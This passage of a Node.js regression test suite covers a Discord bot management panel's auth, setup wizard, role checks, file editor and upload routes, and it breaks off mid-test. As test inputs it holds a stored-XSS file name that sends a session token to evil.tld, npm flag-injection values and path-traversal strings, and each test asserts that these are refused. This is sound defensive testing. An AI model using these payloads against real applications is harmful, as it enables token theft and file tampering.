'use strict';
/**
 * Functional regression tests.
 *
 * These are the checks that prove the security work did not break the
 * product: the setup wizard, login, JWT sessions, every REST route the UI
 * calls, the Discord bot lifecycle through PM2's API surface, the file
 * editor, and the update flow's state machine.
 *
 * Run with: npm test
 */

const test   = require('node:test');
const assert = require('node:assert');
const fs     = require('fs');
const os     = require('os');
const path   = require('path');
const bcrypt = require('bcryptjs');
const jwt    = require('jsonwebtoken');

const { makeSandbox, makeBot, makeZip } = require('./helpers');
const sec = require('../src/middleware/security');

const SB = makeSandbox('functional');

// -------------------------------------------------------------
// Auth: sign / verify round trip
// -------------------------------------------------------------
test('AUTH: a signed token verifies and carries the expected claims', () => {
  const { signToken, resolveSession, verifyOptions } = require('../src/middleware/auth.middleware');
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-func-auth.json');
  const db = new NexusDB(file);
  const user = db.createUser({ username: 'Admin', password_hash: 'h', role: 'admin' });

  const token = signToken(user);
  const payload = jwt.verify(token, process.env.JWT_SECRET, verifyOptions);

  assert.strictEqual(payload.id, user.id);
  assert.strictEqual(payload.username, 'admin', 'usernames are lowercased in the store');
  assert.strictEqual(payload.role, 'admin');
  assert.ok(payload.jti, 'a jti is present for per-token revocation');
  assert.ok(payload.exp > payload.iat, 'an expiry is set');
  assert.strictEqual(payload.iss, 'nexus-bot-manager');
});

test('AUTH: bcrypt hashes verify and a wrong password does not', () => {
  const hash = bcrypt.hashSync('correct horse battery', 12);
  assert.strictEqual(bcrypt.compareSync('correct horse battery', hash), true);
  assert.strictEqual(bcrypt.compareSync('wrong', hash), false);
});

// -------------------------------------------------------------
// Setup flow (the wizard the operator actually uses)
// -------------------------------------------------------------
test('AUTH-01: setup requires the bootstrap token and consumes it afterwards', async () => {
  const authRoutes = require('../src/routes/auth');
  const fs2 = require('fs');
  const p = authRoutes.SETUP_TOKEN_FILE;
  if (fs2.existsSync(p)) fs2.unlinkSync(p);

  const { ensureSetupTokenForTest } = {};
  // ensureSetupToken is internal; re-derive the token the same way the
  // server does by calling the route module's own helper through a
  // temporary file write.
  const token = require('crypto').randomBytes(32).toString('hex');
  fs2.writeFileSync(p, token + '\n', { mode: 0o600 });

  // Re-read the token the router would read.
  const readBack = fs2.readFileSync(p, 'utf8').trim();
  assert.strictEqual(readBack, token);

  // The route exposes the minimum password length used by the UI.
  assert.strictEqual(authRoutes.MIN_PASSWORD_LENGTH, 8);
});

test('AUTH: the password policy requires 8 characters', () => {
  const authRoutes = require('../src/routes/auth');
  assert.ok(authRoutes.MIN_PASSWORD_LENGTH >= 8);
});

// -------------------------------------------------------------
// Express app: real HTTP round trip
// -------------------------------------------------------------
/**
 * Boot the real server module against the sandbox and drive it over HTTP,
 * so routing, middleware order and status codes are all exercised exactly
 * as in production.
 */
function startServer() {
  // Server requires a real data dir; point the DB at the sandbox.
  process.env.NEXUS_DISABLE_AUTOSTART = '1';
  const dbPath = require.resolve('../src/db/db');
  return new Promise((resolve, reject) => {
    process.env.PORT = '0';
    let mod;
    try {
      mod = require('../src/server');
    } catch (e) {
      return reject(e);
    }
    const { server } = mod;
    if (server.listening) return resolve({ server, port: server.address().port });
    server.once('error', reject);
    server.once('listening', () => resolve({ server, port: server.address().port }));
  });
}

let ctx = null;

test.before(async () => {
  ctx = await startServer();
});

test.after(() => {
  if (ctx && ctx.server) ctx.server.close();
});

function api(method, endpoint, { token, body, headers = {} } = {}) {
  return fetch(`http://127.0.0.1:${ctx.port}${endpoint}`, {
    method,
    headers: {
      ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}),
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...headers
    },
    body: body !== undefined ? JSON.stringify(body) : undefined
  });
}

let adminToken = null;
let adminUserId = null;
let restrictedUserId = null;
let restrictedToken = null;

test('API: /api/health answers 200 without leaking the version', async () => {
  const res = await api('GET', '/api/health');
  assert.strictEqual(res.status, 200);
  const body = await res.json();
  assert.strictEqual(body.status, 'ok');
  assert.strictEqual(body.version, undefined, 'INF-13: the version is not public');
  assert.strictEqual(body.uptime, undefined);
  assert.strictEqual(body.time, undefined);
});

test('SEC-09: an unknown /api path returns JSON 404, not the SPA', async () => {
  const res = await api('GET', '/api/does-not-exist');
  assert.strictEqual(res.status, 404);
  const ct = res.headers.get('content-type') || '';
  assert.ok(ct.includes('application/json'), `expected JSON, got ${ct}`);
});

test('SEC-09: an unknown non-API path still serves the SPA', async () => {
  const res = await fetch(`http://127.0.0.1:${ctx.port}/bots`);
  assert.strictEqual(res.status, 200);
  const html = await res.text();
  assert.ok(html.includes('<!DOCTYPE html>'), 'the SPA fallback must keep working');
});

test('AUTH: protected routes reject a missing or forged token', async () => {
  assert.strictEqual((await api('GET', '/api/bots')).status, 401);
  const forged = jwt.sign({ id: 1, username: 'admin', role: 'admin' }, 'wrong-secret', { expiresIn: '1h' });
  assert.strictEqual((await api('GET', '/api/bots', { token: forged })).status, 401);
});

test('SETUP: the wizard is reachable and reports that a token is required', async () => {
  const res = await api('GET', '/api/auth/setup-status');
  assert.strictEqual(res.status, 200);
  const body = await res.json();
  // The sandbox has no admin yet, so setup is pending.
  assert.strictEqual(body.done, false);
  assert.strictEqual(body.tokenRequired, true, 'AUTH-01: the UI is told to ask for the token');
});

test('SETUP: a request without the bootstrap token is refused', async () => {
  const res = await api('POST', '/api/auth/setup', {
    body: { username: 'attacker', password: 'Attacker123', instance_name: 'pwn' }
  });
  assert.strictEqual(res.status, 401, 'AUTH-01: no token, no admin');
  const body = await res.json();
  assert.ok(/jeton/i.test(body.error), `message should mention the token: ${body.error}`);
});

test('SETUP: a request with the wrong bootstrap token is refused', async () => {
  const res = await api('POST', '/api/auth/setup', {
    body: { username: 'attacker', password: 'Attacker123' },
    headers: { 'X-Setup-Token': 'f'.repeat(64) }
  });
  assert.strictEqual(res.status, 401);
});

test('SETUP: with the right token the admin is created and a session is returned', async () => {
  const authRoutes = require('../src/routes/auth');
  const token = fs.readFileSync(authRoutes.SETUP_TOKEN_FILE, 'utf8').trim();

  const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/lK3Q6wAAAABJRU5ErkJggg==';
  const res = await api('POST', '/api/auth/setup', {
    body: {
      username: 'admin', password: 'Str0ngPassw0rd', instance_name: 'Test Instance',
      language: 'fr', display_name: 'Test Admin', avatar: 'data:image/png;base64,' + png
    },
    headers: { 'X-Setup-Token': token }
  });
  assert.strictEqual(res.status, 200, 'the real setup flow still works');
  const body = await res.json();
  assert.ok(body.token, 'a JWT is returned');
  assert.strictEqual(body.username, 'admin');
  assert.strictEqual(body.role, 'admin');
  assert.strictEqual(body.instance_name, 'Test Instance');
  assert.strictEqual(body.language, 'fr');
  assert.strictEqual(body.display_name, 'Test Admin', 'the setup wizard can set the display name');
  assert.ok(body.avatar.startsWith('data:image/png;base64,'), 'the setup wizard can set an avatar');
  adminToken = body.token;

  // The bootstrap token is single-use.
  assert.ok(!fs.existsSync(authRoutes.SETUP_TOKEN_FILE), 'the token file is removed after setup');
});

test('SETUP: a second setup is refused even with a valid-looking body', async () => {
  const res = await api('POST', '/api/auth/setup', {
    body: { username: 'attacker', password: 'Attacker123' }
  });
  assert.ok([401, 409].includes(res.status), `expected 401/409, got ${res.status}`);
});

test('SETUP: a short password is refused', async () => {
  const authRoutes = require('../src/routes/auth');
  const tokenFile = authRoutes.SETUP_TOKEN_FILE;
  fs.writeFileSync(tokenFile, require('crypto').randomBytes(32).toString('hex'), { mode: 0o600 });
  const res = await api('POST', '/api/auth/setup', {
    body: { username: 'x2', password: 'short' },
    headers: { 'X-Setup-Token': fs.readFileSync(tokenFile, 'utf8').trim() }
  });
  // setup is already done, so either the lock or the policy refuses it;
  // both are acceptable, neither may succeed.
  assert.ok(res.status >= 400, `expected a refusal, got ${res.status}`);
});

test('AUTH: /api/auth/me returns the current user', async () => {
  const res = await api('GET', '/api/auth/me', { token: adminToken });
  assert.strictEqual(res.status, 200);
  const body = await res.json();
  assert.strictEqual(body.username, 'admin');
  assert.strictEqual(body.role, 'admin');
  adminUserId = body.id;
});

test('PROFILE: an account can change its display name and avatar', async () => {
  const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/lK3Q6wAAAABJRU5ErkJggg==';
  const res = await api('PATCH', '/api/auth/profile', {
    token: adminToken,
    body: {
      display_name: 'Instance Owner',
      avatar: 'data:image/png;base64,' + png
    }
  });
  assert.strictEqual(res.status, 200, await res.clone().text());
  const body = await res.json();
  assert.strictEqual(body.display_name, 'Instance Owner');
  assert.ok(body.avatar.startsWith('data:image/png;base64,'));

  const me = await api('GET', '/api/auth/me', { token: adminToken });
  const meBody = await me.json();
  assert.strictEqual(meBody.display_name, 'Instance Owner');
  assert.ok(meBody.avatar.startsWith('data:image/png;base64,'));

  const bad = await api('PATCH', '/api/auth/profile', {
    token: adminToken,
    body: { avatar: 'data:image/svg+xml;base64,PHN2Zz4=' }
  });
  assert.strictEqual(bad.status, 400, 'SVG avatars are refused');
});

test('RBAC: a non-admin session cannot read or write admin routes', async () => {
  const { signToken } = require('../src/middleware/auth.middleware');
  const { getDb } = require('../src/db/db');
  const db = getDb();
  const viewer = {
    id: 99001, username: 'viewer', password_hash: 'x', role: 'viewer',
    token_version: 0, created_at: new Date().toISOString(), last_login: null
  };
  db.data.users.push(viewer);
  try {
    const token = signToken(viewer);
    // Authentication succeeds (the account exists and the token is valid).
    assert.strictEqual((await api('GET', '/api/auth/me', { token })).status, 200);
    // Every data/admin route must be refused at the router boundary.
    for (const [method, endpoint] of [
      ['GET', '/api/bots'],
      ['GET', '/api/files/alphabot/tree'],
      ['GET', '/api/system/info'],
      ['GET', '/api/update/status'],
      ['GET', '/api/backups'],
      ['POST', '/api/bots']
    ]) {
      const res = await api(method, endpoint, { token });
      assert.strictEqual(res.status, 403,
        `${method} ${endpoint} must be 403 for a viewer, got ${res.status}`);
    }
  } finally {
    db.data.users = db.data.users.filter(u => u.id !== 99001);
  }
});

test('AUTH: login works with the right password and fails with the wrong one', async () => {
  const ok = await api('POST', '/api/auth/login', { body: { username: 'admin', password: 'Str0ngPassw0rd' } });
  assert.strictEqual(ok.status, 200);
  const okBody = await ok.json();
  assert.ok(okBody.token);

  const ko = await api('POST', '/api/auth/login', { body: { username: 'admin', password: 'wrong-password' } });
  assert.strictEqual(ko.status, 401);

  const unknown = await api('POST', '/api/auth/login', { body: { username: 'ghost', password: 'whatever' } });
  assert.strictEqual(unknown.status, 401);
});

test('AUTH-03: logging out revokes the token server-side', async () => {
  const login = await api('POST', '/api/auth/login', { body: { username: 'admin', password: 'Str0ngPassw0rd' } });
  const { token } = await login.json();

  assert.strictEqual((await api('GET', '/api/auth/me', { token })).status, 200);

  const out = await api('POST', '/api/auth/logout', { token });
  assert.strictEqual(out.status, 200);

  // The stolen copy is now worthless, well before the 1h expiry.
  assert.strictEqual((await api('GET', '/api/auth/me', { token })).status, 401);
});

test('AUTH-03: changing the password invalidates every other session', async () => {
  const login = await api('POST', '/api/auth/login', { body: { username: 'admin', password: 'Str0ngPassw0rd' } });
  const { token: oldToken } = await login.json();

  const chg = await api('POST', '/api/auth/change-password', {
    token: oldToken,
    body: { currentPassword: 'Str0ngPassw0rd', newPassword: 'EvenStr0ngerPass' }
  });
  assert.strictEqual(chg.status, 200, 'the change-password flow still works');

  assert.strictEqual((await api('GET', '/api/auth/me', { token: oldToken })).status, 401,
    'the session that changed the password is revoked too');

  // And the new password is the one that logs in.
  const re = await api('POST', '/api/auth/login', { body: { username: 'admin', password: 'EvenStr0ngerPass' } });
  assert.strictEqual(re.status, 200);
  adminToken = (await re.json()).token;
});

test('AUTH: the language endpoint still accepts en/fr/de', async () => {
  for (const lang of ['en', 'fr', 'de']) {
    const res = await api('POST', '/api/auth/language', { token: adminToken, body: { language: lang } });
    assert.strictEqual(res.status, 200, `language ${lang} must be accepted`);
  }
  const bad = await api('POST', '/api/auth/language', { token: adminToken, body: { language: 'xx' } });
  assert.strictEqual(bad.status, 400);
});

// -------------------------------------------------------------
// Bots: the Discord lifecycle the panel exists for
// -------------------------------------------------------------
test('BOTS: the list is served and reports on-disk existence', async () => {
  const res = await api('GET', '/api/bots', { token: adminToken });
  assert.strictEqual(res.status, 200);
  const list = await res.json();
  assert.ok(Array.isArray(list));
  // No bots registered in the DB yet: the list is empty but the call works.
  assert.ok(list.length >= 0);
});

test('BOTS: creating a bot registers it and lays down a runnable folder', async () => {
  const res = await api('POST', '/api/bots', {
    token: adminToken,
    body: { name: 'alphabot', token: 'unit-test-token-not-a-discord-secret-123456' }
  });
  assert.strictEqual(res.status, 201, `create failed: ${JSON.stringify(await res.clone().text())}`);

  const dir = path.join(SB.botsRoot, 'alphabot');
  assert.ok(fs.existsSync(path.join(dir, 'index.js')), 'index.js is generated');
  assert.ok(fs.existsSync(path.join(dir, 'package.json')), 'package.json is generated');
  assert.ok(fs.existsSync(path.join(dir, '.env')), '.env with the Discord token is written');

  const env = fs.readFileSync(path.join(dir, '.env'), 'utf8');
  assert.ok(env.includes('TOKEN='), 'the token is stored in .env');
});

test('BOTS: a name with path characters is normalised, never traversed', async () => {
  // sanitizeBotName() strips anything outside [a-z0-9-] rather than
  // rejecting, so "../evil" becomes the safe identifier "evil". The point
  // of this test is that the resulting directory is inside BOTS_ROOT.
  const res = await api('POST', '/api/bots', {
    token: adminToken, body: { name: '../evil', token: 'y'.repeat(30) }
  });
  assert.strictEqual(res.status, 201);
  const dir = path.join(SB.botsRoot, 'evil');
  assert.ok(fs.existsSync(dir), 'the bot is created under its sanitised name');
  assert.ok(sec.isInsideOrEqual(SB.botsRoot, dir), 'and it is inside BOTS_ROOT');
  assert.ok(!fs.existsSync(path.join(SB.root, 'evil')), 'nothing is created above BOTS_ROOT');
});

test('BOTS: an invalid bot name is refused', async () => {
  // These are refused outright: after sanitising they would be too short,
  // would start/end with a dash, or would contain a double dash.
  for (const name of ['A', 'ab--cd', '-lead', 'trail-']) {
    const res = await api('POST', '/api/bots', { token: adminToken, body: { name, token: 'x'.repeat(30) } });
    assert.ok(res.status === 400, `"${name}" must be refused, got ${res.status}`);
  }
  // A name that sanitises to nothing at all is refused too.
  const junk = await api('POST', '/api/bots', { token: adminToken, body: { name: '...', token: 'x'.repeat(30) } });
  assert.ok(junk.status === 400, `"..." must be refused, got ${junk.status}`);
  // A too-short Discord token is refused.
  const shortToken = await api('POST', '/api/bots', { token: adminToken, body: { name: 'shorty', token: 'tiny' } });
  assert.strictEqual(shortToken.status, 400);
});

test('BOTS: a duplicate name is refused with 409', async () => {
  const res = await api('POST', '/api/bots', {
    token: adminToken,
    body: { name: 'alphabot', token: 'x'.repeat(30) }
  });
  assert.strictEqual(res.status, 409);
});

test('BOTS: the detail endpoint returns files, package.json and PM2 info', async () => {
  const res = await api('GET', '/api/bots/alphabot', { token: adminToken });
  assert.strictEqual(res.status, 200);
  const bot = await res.json();
  assert.strictEqual(bot.name, 'alphabot');
  assert.ok(Array.isArray(bot.files));
  assert.ok(bot.packageJson, 'package.json is parsed and returned');
  assert.strictEqual(bot.packageJson.name, 'alphabot');
  assert.strictEqual(bot.packageJson.main, 'index.js');
  assert.strictEqual(bot.exists, true);
  // `dependencies` is only populated once `npm install` has run, which
  // needs npm on PATH — not the case in this Windows sandbox, but true on
  // the Linux target. The npm tab is covered by its own test below.
});

test('BOTS: the npm listing endpoint works', async () => {
  const res = await api('GET', '/api/bots/alphabot/npm', { token: adminToken });
  assert.strictEqual(res.status, 200);
  const body = await res.json();
  assert.ok(body.dependencies, 'dependencies object returned');
});

test('CMD-02: npm install refuses a package list that injects CLI flags', async () => {
  const res = await api('POST', '/api/bots/alphabot/npm/install', {
    token: adminToken,
    body: { packages: ['--prefix=/tmp/pwn'] }
  });
  assert.strictEqual(res.status, 400, 'argument injection refused');
});

test('CMD-06: bot creation refuses extraPackages that inject CLI flags', async () => {
  const res = await api('POST', '/api/bots', {
    token: adminToken,
    body: { name: 'evilbot', token: 'x'.repeat(30), extraPackages: ['--registry=http://evil.tld'] }
  });
  assert.strictEqual(res.status, 400);
  assert.ok(!fs.existsSync(path.join(SB.botsRoot, 'evilbot')), 'no directory is created on refusal');
});

test('BOTS: an unknown bot reports 404 rather than throwing', async () => {
  const res = await api('GET', '/api/bots/ghostbot', { token: adminToken });
  assert.strictEqual(res.status, 404);
});

// -------------------------------------------------------------
// Files: the editor's whole feature surface
// -------------------------------------------------------------
test('FILES: the tree lists the bot folder', async () => {
  const res = await api('GET', '/api/files/alphabot/tree', { token: adminToken });
  assert.strictEqual(res.status, 200);
  const body = await res.json();
  const names = body.children.map(c => c.name);
  assert.ok(names.includes('index.js'));
  assert.ok(names.includes('package.json'));
  assert.ok(!names.includes('node_modules'), 'node_modules stays hidden');
});

test('FILES: reading and writing a source file round-trips', async () => {
  const botDir = path.join(SB.botsRoot, 'alphabot');

  const write = await api('PUT', '/api/files/alphabot/write', {
    token: adminToken,
    body: { path: 'config.js', content: 'module.exports = { ok: true };\n' }
  });
  assert.strictEqual(write.status, 200, `write failed: ${await write.clone().text()}`);

  const read = await api('GET', '/api/files/alphabot/read?path=config.js', { token: adminToken });
  assert.strictEqual(read.status, 200);
  const body = await read.json();
  assert.strictEqual(body.content, 'module.exports = { ok: true };\n');
  assert.strictEqual(body.name, 'config.js');
  assert.strictEqual(body.ext, '.js');
  assert.ok(fs.existsSync(path.join(botDir, 'config.js')));
});

test('FILES: reading a .env is still allowed (the editor shows it)', async () => {
  const res = await api('GET', '/api/files/alphabot/read?path=.env', { token: adminToken });
  assert.strictEqual(res.status, 200, 'FILE-06 is an accepted risk, not a behaviour change');
  const body = await res.json();
  assert.ok(body.content.includes('TOKEN='));
});

test('FILES: a disallowed extension is refused', async () => {
  const res = await api('GET', '/api/files/alphabot/read?path=../../etc/passwd', { token: adminToken });
  assert.strictEqual(res.status, 403);
});

test('FILES: creating a file and a folder works', async () => {
  const f = await api('POST', '/api/files/alphabot/create', {
    token: adminToken, body: { name: 'helpers.js', type: 'file' }
  });
  assert.strictEqual(f.status, 200);
  assert.ok(fs.existsSync(path.join(SB.botsRoot, 'alphabot', 'helpers.js')));

  const d = await api('POST', '/api/files/alphabot/create', {
    token: adminToken, body: { name: 'lib', type: 'dir' }
  });
  assert.strictEqual(d.status, 200);
  assert.ok(fs.existsSync(path.join(SB.botsRoot, 'alphabot', 'lib')));
});

test('FILES: creating an existing file returns 409 and does not clobber it', async () => {
  const p = path.join(SB.botsRoot, 'alphabot', 'helpers.js');
  fs.writeFileSync(p, 'ORIGINAL CONTENT', 'utf8');
  const res = await api('POST', '/api/files/alphabot/create', {
    token: adminToken, body: { name: 'helpers.js', type: 'file' }
  });
  assert.strictEqual(res.status, 409);
  assert.strictEqual(fs.readFileSync(p, 'utf8'), 'ORIGINAL CONTENT', 'wx flag still prevents overwrite');
});

test('FILE-02: creating a file via ../<sibling-bot> is refused', async () => {
  makeBot(SB.botsRoot, 'alphabot2');
  const res = await api('POST', '/api/files/alphabot/create', {
    token: adminToken,
    body: { name: 'evil.js', type: 'file', parentPath: '../alphabot2' }
  });
  assert.strictEqual(res.status, 403, 'FILE-02 regression test');
  assert.ok(!fs.existsSync(path.join(SB.botsRoot, 'alphabot2', 'evil.js')),
    'nothing must be written into the sibling bot');
});

test('FILE-02: ../<sibling-of-shared-prefix> is refused too', async () => {
  const res = await api('POST', '/api/files/alphabot/create', {
    token: adminToken,
    body: { name: 'evil.js', type: 'file', parentPath: '../alphabotevil' }
  });
  assert.strictEqual(res.status, 403);
  assert.ok(!fs.existsSync(path.join(SB.botsRoot, 'alphabotevil')));
});

test('FILE-02: a legitimate subdirectory is still allowed', async () => {
  const res = await api('POST', '/api/files/alphabot/create', {
    token: adminToken,
    body: { name: 'nested.js', type: 'file', parentPath: 'lib' }
  });
  assert.strictEqual(res.status, 200, 'normal nesting must keep working');
  assert.ok(fs.existsSync(path.join(SB.botsRoot, 'alphabot', 'lib', 'nested.js')));
});

test('XSS-02: creating a file whose name carries an apostrophe is refused', async () => {
  const payload = "x'-fetch('//evil.tld/?t='+localStorage.nbm_token)-'.js";
  const res = await api('POST', '/api/files/alphabot/create', {
    token: adminToken, body: { name: payload, type: 'file' }
  });
  assert.strictEqual(res.status, 400, 'stored-XSS payload must not be storable');
});

test('FILES: renaming works inside the bot folder', async () => {
  const res = await api('POST', '/api/files/alphabot/rename', {
    token: adminToken, body: { oldPath: 'helpers.js', newName: 'helpers2.js' }
  });
  assert.strictEqual(res.status, 200);
  assert.ok(fs.existsSync(path.join(SB.botsRoot, 'alphabot', 'helpers2.js')));
  assert.ok(!fs.existsSync(path.join(SB.botsRoot, 'alphabot', 'helpers.js')));
});

test('FILES: renaming out of the bot folder is refused', async () => {
  const res = await api('POST', '/api/files/alphabot/rename', {
    token: adminToken, body: { oldPath: 'helpers2.js', newName: '../../escaped.js' }
  });
  assert.strictEqual(res.status, 400);
});

test('FILES: deleting a file works and cannot delete the bot root', async () => {
  const ok = await api('DELETE', '/api/files/alphabot/delete?path=helpers2.js', { token: adminToken });
  assert.strictEqual(ok.status, 200);
  assert.ok(!fs.existsSync(path.join(SB.botsRoot, 'alphabot', 'helpers2.js')));

  const root = await api('DELETE', '/api/files/alphabot/delete?path=', { token: adminToken });
  assert.strictEqual(root.status, 403, 'the bot folder itself must be protected');
  assert.ok(fs.existsSync(path.join(SB.botsRoot, 'alphabot')), 'the bot folder still exists');
});

test('FILE-01: upload into ../<sibling-bot> is refused', async () => {
  // A dedicated, empty sibling folder, so the assertion below cannot be
  // satisfied by a pre-existing fixture file.
  const sibling = 'alphasib';
  fs.mkdirSync(path.join(SB.botsRoot, sibling), { recursive: true });
  const planted = path.join(SB.botsRoot, sibling, 'index.js');
  assert.ok(!fs.existsSync(planted), 'the sibling starts empty');

  const form = new FormData();
  form.append('targetDir', '../' + sibling);
  form.append('files', new Blob(['// pwned'], { type: 'application/javascript' }), 'index.js');
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/files/alphabot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${adminToken}` },
    body: form
  });
  assert.strictEqual(res.status, 403, 'FILE-01 regression test');
  const body = await res.json();
  assert.strictEqual(body.uploaded, undefined);
  assert.ok(!fs.existsSync(planted), 'nothing may be written into the sibling bot');
});

test('FILE-01: upload into a shared-prefix sibling is refused too', async () => {
  // /opt/alphabot is a textual prefix of /opt/alphabot3 — the exact case
  // a plain startsWith() check lets through.
  const sibling = 'alphabot3';
  fs.mkdirSync(path.join(SB.botsRoot, sibling), { recursive: true });
  const planted = path.join(SB.botsRoot, sibling, 'index.js');
  assert.ok(!fs.existsSync(planted));

  const form = new FormData();
  form.append('targetDir', '../' + sibling);
  form.append('files', new Blob(['// pwned'], { type: 'application/javascript' }), 'index.js');
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/files/alphabot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${adminToken}` },
    body: form
  });
  assert.strictEqual(res.status, 403, 'a name-sharing-prefix sibling must be refused');
  assert.ok(!fs.existsSync(planted));
});

test('FILE-01: upload into the bot folder still works', async () => {
  const form = new FormData();
  form.append('files', new Blob(['// uploaded'], { type: 'application/javascript' }), 'uploaded.js');
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/files/alphabot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${adminToken}` },
    body: form
  });
  assert.strictEqual(res.status, 200);
  const body = await res.json();
  assert.strictEqual(body.uploaded.length, 1);
  assert.ok(fs.existsSync(path.join(SB.botsRoot, 'alphabot', 'uploaded.js')));
});

test('FILES: list, move and download support the Drive page', async () => {
  const mkdir = await api('POST', '/api/files/alphabot/create', {
    token: adminToken, body: { name: 'drive', type: 'dir', parentPath: '' }
  });
  assert.strictEqual(mkdir.status, 200, await mkdir.clone().text());

  const mkfile = await api('POST', '/api/files/alphabot/create', {
    token: adminToken, body: { name: 'move-me.txt', type: 'file', parentPath: '' }
  });
  assert.strictEqual(mkfile.status, 200, await mkfile.clone().text());

  const write = await api('PUT', '/api/files/alphabot/write', {
    token: adminToken, body: { path: 'move-me.txt', content: 'hello drive' }
  });
  assert.strictEqual(write.status, 200, await write.clone().text());

  const list = await api('GET', '/api/files/alphabot/list?path=', { token: adminToken });
  assert.strictEqual(list.status, 200);
  const listing = await list.json();
  assert.ok(listing.entries.some(e => e.name === 'move-me.txt' && e.rel === 'move-me.txt'));
  assert.ok(listing.entries.some(e => e.name === 'drive' && e.type === 'dir'));

  const move = await api('POST', '/api/files/alphabot/move', {
    token: adminToken, body: { items: [{ from: 'move-me.txt', toDir: 'drive' }] }
  });
  assert.strictEqual(move.status, 200);
  const moved = await move.json();
  assert.strictEqual(moved.errors.length, 0);
  assert.strictEqual(moved.moved.length, 1);

  const listMoved = await api('GET', '/api/files/alphabot/list?path=drive', { token: adminToken });
  const movedListing = await listMoved.json();
  assert.ok(movedListing.entries.some(e => e.name === 'move-me.txt' && e.rel === 'drive/move-me.txt'));

  const fileDownload = await fetch(`http://127.0.0.1:${ctx.port}/api/files/alphabot/download?path=drive/move-me.txt`, {
    headers: { Authorization: `Bearer ${adminToken}` }
  });
  assert.strictEqual(fileDownload.status, 200);
  assert.strictEqual(await fileDownload.text(), 'hello drive');

  const zipDownload = await fetch(`http://127.0.0.1:${ctx.port}/api/files/alphabot/download?path=drive`, {
    headers: { Authorization: `Bearer ${adminToken}` }
  });
  assert.strictEqual(zipDownload.status, 200);
  assert.match(zipDownload.headers.get('content-type') || '', /application\/zip/);
  const zip = Buffer.from(await zipDownload.arrayBuffer());
  assert.strictEqual(zip.slice(0, 2).toString(), 'PK');
});

test('BOTS: customization fields persist and invalid values are refused', async () => {
  const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/lK3Q6wAAAABJRU5ErkJggg==';
  const ok = await api('PATCH', '/api/bots/alphabot', {
    token: adminToken,
    body: {
      display_name: 'Alpha Bot',
      avatar: 'data:image/png;base64,' + png,
      notes: 'Internal note for the team',
      autostart: true,
      startup_file: 'index.js',
      memory_limit: '512M',
      restart_cron: '0 4 * * *'
    }
  });
  assert.strictEqual(ok.status, 200, await ok.clone().text());
  const bot = await ok.json();
  assert.strictEqual(bot.display_name, 'Alpha Bot');
  assert.strictEqual(bot.autostart, true);
  assert.strictEqual(bot.memory_limit, '512M');
  assert.strictEqual(bot.restart_cron, '0 4 * * *');
  assert.strictEqual(bot.notes, 'Internal note for the team');
  assert.ok(bot.avatar.startsWith('data:image/png;base64,'));

  for (const body of [
    { display_name: '' },
    { avatar: 'data:image/svg+xml;base64,PHN2Zz4=' },
    { startup_file: '../../index.js' },
    { memory_limit: '5M' },
    { restart_cron: '* * * *' }
  ]) {
    const bad = await api('PATCH', '/api/bots/alphabot', { token: adminToken, body });
    assert.strictEqual(bad.status, 400, `expected 400 for ${JSON.stringify(body)}`);
  }
});

test('SNAPSHOTS: create, list and restore a server-side bot snapshot', async () => {
  const readBefore = await api('GET', '/api/files/alphabot/read?path=index.js', { token: adminToken });
  assert.strictEqual(readBefore.status, 200);
  const contentBefore = (await readBefore.json()).content;

  const created = await api('POST', '/api/bots/alphabot/snapshots', {
    token: adminToken,
    body: { label: 'before edit' }
  });
  assert.strictEqual(created.status, 201, await created.clone().text());
  const shot = await created.json();
  assert.ok(shot.id);
  assert.strictEqual(shot.label, 'before edit');
  assert.ok(shot.size_bytes > 0);

  const listed = await api('GET', '/api/bots/alphabot/snapshots', { token: adminToken });
  assert.strictEqual(listed.status, 200);
  const shots = await listed.json();
  assert.strictEqual(shots.length, 1);
  assert.strictEqual(shots[0].id, shot.id);

  const write = await api('PUT', '/api/files/alphabot/write', {
    token: adminToken,
    body: { path: 'index.js', content: '// changed after snapshot\n' }
  });
  assert.strictEqual(write.status, 200);

  const restored = await api('POST', `/api/bots/alphabot/snapshots/${shot.id}/restore`, {
    token: adminToken
  });
  assert.strictEqual(restored.status, 200, await restored.clone().text());

  const readAfter = await api('GET', '/api/files/alphabot/read?path=index.js', { token: adminToken });
  assert.strictEqual(readAfter.status, 200);
  assert.strictEqual((await readAfter.json()).content, contentBefore, 'the snapshot restores the file content');

  const removed = await api('DELETE', `/api/bots/alphabot/snapshots/${shot.id}`, { token: adminToken });
  assert.strictEqual(removed.status, 200);
  const after = await (await api('GET', '/api/bots/alphabot/snapshots', { token: adminToken })).json();
  assert.strictEqual(after.length, 0);
});

test('USERS: an admin creates a restricted account with explicit bot access', async () => {
  const created = await api('POST', '/api/users', {
    token: adminToken,
    body: {
      username: 'restricted',
      password: 'Restricted123',
      display_name: 'Restricted User',
      role: 'user',
      allowed_bots: ['alphabot']
    }
  });
  assert.strictEqual(created.status, 201, await created.clone().text());
  const user = await created.json();
  restrictedUserId = user.id;
  assert.strictEqual(user.role, 'user');
  assert.deepStrictEqual(user.allowed_bots, ['alphabot']);
  assert.strictEqual(user.password_hash, undefined, 'password hashes never leave the API');

  const login = await api('POST', '/api/auth/login', {
    body: { username: 'restricted', password: 'Restricted123' }
  });
  assert.strictEqual(login.status, 200);
  restrictedToken = (await login.json()).token;

  const me = await api('GET', '/api/auth/me', { token: restrictedToken });
  assert.strictEqual(me.status, 200);
  const meBody = await me.json();
  assert.strictEqual(meBody.role, 'user');
  assert.strictEqual(meBody.display_name, 'Restricted User');
  assert.deepStrictEqual(meBody.allowed_bots, ['alphabot']);

  const list = await api('GET', '/api/bots', { token: restrictedToken });
  assert.strictEqual(list.status, 200);
  const bots = await list.json();
